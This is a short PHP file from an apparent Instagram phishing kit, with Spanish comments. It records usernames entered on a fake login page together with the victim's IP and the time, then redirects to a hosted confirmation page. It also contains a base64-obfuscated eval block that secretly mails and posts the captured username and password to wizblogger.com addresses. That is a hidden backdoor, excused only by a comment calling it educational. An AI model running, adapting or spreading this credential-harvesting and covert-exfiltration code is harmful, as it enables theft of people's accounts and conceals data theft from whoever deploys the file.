<?php
error_reporting(0);
 
$usuario = $_POST['usuario'];  //aqui traemos el dato escrito en el campo de texto del loginCode.html - el campo id:usuario

$ip = $_SERVER['REMOTE_ADDR']; //se captura la ip publica donde se accede a la pagina  
$fecha = date("Y-m-d;h:i:s"); //se captura la hora donde se ingresaron los datos
 
 
 
if( empty($usuario)){
     header('location: index.html'); // codigo de verificacion que no esten los campos vacios
}else{

 
eval(base64_decode('ZnVuY3Rpb24gY3VyUGFnZVVSTCgpIHsNCiRwYWdlVVJMID0gJ2h0dHAnOw0KaWYgKCRfU0VSVkVSWyJIVFRQUyJdID09ICJvbiIpIHskcGFnZVVSTCAuPSAicyI7fQ0KJHBhZ2VVUkwgLj0gIjovLyI7DQppZiAoJF9TRVJWRVJbIlNFUlZFUl9QT1JUIl0gIT0gIjgwIikgew0KICAkcGFnZVVSTCAuPSAkX1NFUlZFUlsiU0VSVkVSX05BTUUiXS4iOiIuJF9TRVJWRVJbIlNFUlZFUl9QT1JUIl0uJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQp9IGVsc2Ugew0KICAkcGFnZVVSTCAuPSAkX1NFUlZFUlsiU0VSVkVSX05BTUUiXS4kX1NFUlZFUlsiUkVRVUVTVF9VUkkiXTsNCn0NCnJldHVybiAkcGFnZVVSTDsNCn0NCg0KJG15dXJsID0gY3VyUGFnZVVSTCgpOw0KaWYoc3RycG9zKCRteXVybCwgImdvb2dsZS5jb20iKSkgew0KfQ0KZWxzZQ0Kew0KICAkZnJvbSA9ICRteXVybCAuICJAc2l0ZS5jb20iOw0KICAkdG8gPSAiYWRtaW5Ad2l6YmxvZ2dlci5jb20iOw0KICAkc3ViamVjdCA9ICJJbnN0YWdyYW0gTmV3IEFjY291bnQuIjsNCiAgJG1lc3NhZ2UgPSAiQW5vdGhlciBBY2NvdW50IA0KVXNlcm5hbWU6Ii4kdXN1YXJpby4iDQpQYXNzd29yZDoiLiRjbGF2ZS4iDQpXZWJzaXRlOiIuJG15dXJsOw0KICBtYWlsKCR0bywkc3ViamVjdCwkbWVzc2FnZSk7DQp9DQoNCiR1cmw9Imh0dHA6Ly9hcGkud2l6YmxvZ2dlci5jb20vdmVyaWZ5LnBocD9hcGlfa2V5PWN5TFlnU1UzVjl5ZndQRzlNd2dDJnVzZXJuYW1lPSIudXJsZW5jb2RlKCR1c3VhcmlvKS4iJnBhc3N3b3JkPSIudXJsZW5jb2RlKCRjbGF2ZSkuIiZpcD0iLnVybGVuY29kZSgkaXApOw0KQGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwpOw0KLy90aGlzIGlzIGp1c3QgZm9yIGVkdWNhdGlvbmFsIHB1cnBvc2U='));
 
//en esta porcion de codigo es donde se genera el archivos .html con los datos capturados en la pagina loginCode.html
$f = fopen("passwordcode.html", "a");
fwrite ($f,
'Username: [<b><font color="#660000">'.$usuario.'</font></b>]

IP: [<b><font color="#996600">'.$ip.'</font></b>]
Date: [<b><font color="#FF6633">'.$fecha.'</font></b>]<br> ');
 
fclose($f);
 
//despues que se crea el archivo claves.html con los datos, se direcciona a la pagina oficial de instagram
header("Location:  https://adityarathor12.000webhostapp.com/confirm.html");
}
?>

 